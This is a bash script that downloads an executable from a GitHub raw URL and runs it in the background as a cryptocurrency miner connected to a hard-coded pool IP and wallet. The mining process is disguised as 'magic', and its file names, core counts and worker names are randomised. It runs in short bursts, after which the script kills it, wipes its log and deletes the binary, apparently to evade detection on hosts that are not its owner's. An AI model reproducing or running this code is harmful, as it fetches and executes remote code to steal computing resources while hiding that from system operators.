#!/bin/bash

# Function to download and prepare the mining script with a dynamic name
prepare_mining_script() {
  local old_file=$(cat /tmp/magic_file 2>/dev/null)
  if [[ -n "$old_file" && -f "$old_file" ]]; then
    echo "Removing old mining script file: $old_file"
    rm -f "$old_file"
  fi

  local timestamp=$(date '+%Y%m%d%H%M%S')
  local filename="tmii_${timestamp}"
  wget -O $filename https://github.com/barburonjilo/back/raw/main/sr
  chmod +x $filename
  echo $filename > /tmp/magic_file
}

# Function to generate the localized date string with core count
generate_worker() {
  local cores=$1
  TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
    's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
    | sed "s/$/$cores/"
}

# Function to start the mining process with a random number of cores
start_magic() {
  local total_cores=$(nproc)
  local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
  local worker=$(generate_worker $num_cores)  # Generate worker string including core count
  local magic_file=$(cat /tmp/magic_file)

  # Start the mining process without setting CPU affinity and output to log file
  nohup ./$magic_file -a yescryptr32 --pool 45.115.225.240:808 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
  local pid=$!

  echo "Magic started with PID: $pid using $num_cores cores with file $magic_file"

  # Save PID to a file for later use
  echo $pid > /tmp/magic_pid
}

# Function to stop the mining process
stop_magic() {
  if [ -f /tmp/magic_pid ]; then
    local pid=$(cat /tmp/magic_pid)
    local magic_file=$(cat /tmp/magic_file)
    echo "Stopping magic with PID: $pid using file $magic_file"
    kill -9 $pid 2>/dev/null
    rm -f /tmp/magic_pid

    # Empty the mining.log file
    > mining.log

    # Remove the stopped file
    if [[ -f "$magic_file" ]]; then
      echo "Removing stopped mining script file: $magic_file"
      rm -f "$magic_file"
    fi
  else
    echo "No PID file found, cannot stop magic"
  fi
}

# Function to generate a random sleep duration between 5 and 7 minutes
get_random_sleep_duration() {
  local min=300    # 5 minutes in seconds
  local max=420    # 7 minutes in seconds
  echo $((RANDOM % (max - min + 1) + min))
}

# Main execution
prepare_mining_script

# Run the loop
while true; do
  start_magic

  # Get a random sleep duration
  sleep_duration=$(get_random_sleep_duration)
  
  # Validate and debug sleep duration
  if [[ -z "$sleep_duration" || "$sleep_duration" -lt 300 ]]; then
    echo "Error: Invalid sleep duration: $sleep_duration. Defaulting to 5 minutes."
    sleep_duration=300
  elif [[ "$sleep_duration" -gt 420 ]]; then
    echo "Error: Sleep duration exceeds maximum value. Adjusting to 7 minutes."
    sleep_duration=420
  fi
  
  echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
  sleep $sleep_duration
  
  stop_magic
  sleep 120  # Wait for 2 minutes

  # Prepare a new mining script for the next iteration
  prepare_mining_script
done
